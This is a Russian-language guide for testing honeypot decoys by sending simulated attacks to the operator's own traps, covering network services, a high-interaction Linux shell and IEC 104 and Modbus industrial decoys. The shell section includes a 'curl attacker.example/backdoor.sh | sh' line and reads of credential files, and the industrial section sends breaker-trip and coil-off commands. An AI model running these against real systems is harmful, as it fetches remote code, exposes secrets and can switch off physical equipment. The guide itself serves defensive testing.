# Проверка ловушек атаками

Команды ниже проверены на агенте, запущенном с конфигом из центра. Перед
проверкой создайте ловушку нужного класса (вкладка «Хосты» → «+ Создать
ловушку») и запустите её на хосте или локально (см. README). Порты указаны по
умолчанию для класса — если меняли, подставьте свои. `HOST` — адрес машины,
где работает агент.

Через несколько секунд после атаки события видны на вкладке «События» и в
карточке ловушки, а ловушка получает статус «на связи».

## Low Interaction

**`port_listener`** — порты `9000-9003,10443`. Подключения к трём портам с
одного адреса дают событие `scan`:

```bash
for p in 9000 9001 9002; do nc -z -w 1 HOST $p; done
```

**`banner`** — порт 2222. Ловушка отдаёт баннер и записывает ввод (`data`):

```bash
printf 'SSH-2.0-OpenSSH_9.6p1\r\n' | nc -w 2 HOST 2222
```

**`tarpit`** — порт 2223. Клиент получает строку за строкой с паузой
(`delay_ms`) и висит до `max_hold_s`:

```bash
nc HOST 2223
```

**`udp`** — порт 1053/udp, протокол DNS. Ответ на любое имя, событие `data`
с разбором запроса:

```bash
dig @HOST -p 1053 domain.test A
```

**`low_extra`** — порт 1900/tcp. На `M-SEARCH` отвечает как UPnP-устройство,
событие `scan`:

```bash
printf 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: upnp:rootdevice\r\n\r\n' | nc -w 2 HOST 1900
```

## Medium Interaction

**`dialog`** (FTP) — порт 2121. Логин и пароль попадают в событие `auth`:

```bash
printf 'USER secops\r\nPASS Summer2026!\r\nQUIT\r\n' | nc -w 2 HOST 2121
```

**`ssh`** — порт 2222. Настоящий SSH: каждая попытка входа — событие `auth` с
логином и паролем, ответ «Permission denied»:

```bash
ssh -p 2222 root@HOST        # введите любой пароль
```

**`http`** — порт 8080. Форма входа на `/login`, `/admin`, `/wp-admin`
перехватывает логин и пароль (`auth`):

```bash
curl -i -X POST http://HOST:8080/login -d 'username=admin&password=Secret99!'
```

**`medium_extra`**, режим Redis — порт 6379. Пароль из `AUTH` (`auth`),
команды (`command`):

```bash
printf '*2\r\n$4\r\nAUTH\r\n$12\r\nredis_p@ss99\r\n*1\r\n$4\r\nINFO\r\n' | nc -w 2 HOST 6379
```

**`medium_extra`**, режим MQTT — порт 1883. Client ID, логин и пароль из
`CONNECT` (`auth`):

```python
import socket
cid, user, pw = b"plc-01", b"iot", b"s3cret"
var = b"\x00\x04MQTT\x04\xc2\x00\x3c"
payload = b"".join(len(x).to_bytes(2, "big") + x for x in (cid, user, pw))
s = socket.create_connection(("HOST", 1883))
s.sendall(b"\x10" + bytes([len(var) + len(payload)]) + var + payload)
print(s.recv(16))   # CONNACK
```

**`honeytoken`** — порт 8088. После сохранения ловушки у каждой ссылки
появляется ID (виден в параметрах ловушки). Запрос, в котором есть ID, даёт
событие `token`:

```bash
curl -i "http://HOST:8088/share/finance/README.html?id=<ID ссылки>"
```

Приманка типа «Учётка» срабатывает в любой другой ловушке: вход с её логином и
паролем, например в FTP-ловушку, даёт в ней событие `token` с меткой приманки:

```bash
printf 'USER svc_backup\r\nPASS <пароль учётки>\r\nQUIT\r\n' | nc -w 2 HOST 2121
```

## High Interaction

**`high_interaction`** — порт 2222. Оболочка Linux с изменяемой файловой
системой. Каждая команда — событие `command`; запись в файл, `curl | sh`,
`wget`, `base64 -d` — событие `payload` с SHA-256 и началом содержимого;
чтение `/root/.env`, `/root/.ssh/id_rsa`, `/etc/scada/plc_auth.conf` — событие
`token`. `ps`, `netstat`, `env` не показывают агента.

```bash
nc HOST 2222
```

```bash
whoami; id; uname -a
cd /tmp && echo malware > script.sh && ls -la && cat script.sh
cat /root/.env
curl -s http://attacker.example/backdoor.sh | sh
echo IyEvYmluL3NoCmVjaG8gIlJDRSIK | base64 -d > /tmp/rce.sh
ps aux; netstat -tlpn; env
exit
```

## АСУ ТП

**`iec104`** — порт 2404. STARTDT, общий опрос и команда отключения
выключателя (IOA 1001); команда телеуправления — событие `command`:

```python
import socket, time
s = socket.create_connection(("HOST", 2404))
for frame in ("680407000000",                       # STARTDT act
              "680e0000000064010600010000000014",   # общий опрос (C_IC_NA_1)
              "680e020002002d0106000100e9030000"):  # C_SC_NA_1, IOA 1001, откл.
    s.sendall(bytes.fromhex(frame)); time.sleep(0.5)
    print(s.recv(2048).hex())
```

**`scada`** — порт 502. Modbus TCP: чтение регистров, запись койла (событие
`command`), идентификация устройства (MEI):

```python
import socket, time
s = socket.create_connection(("HOST", 502))
for frame in ("000100000006010300000005",   # FC 03: 5 holding-регистров
              "000200000006010500000000",   # FC 05: отключить койл 0
              "000300000005012b0e0100"):    # FC 43/14: производитель и модель
    s.sendall(bytes.fromhex(frame)); time.sleep(0.5)
    print(s.recv(1024))
```

На тот же порт отвечает веб-интерфейс диспетчера:

```bash
curl -i http://HOST:502/
curl -i http://HOST:502/api/v1/tags
```
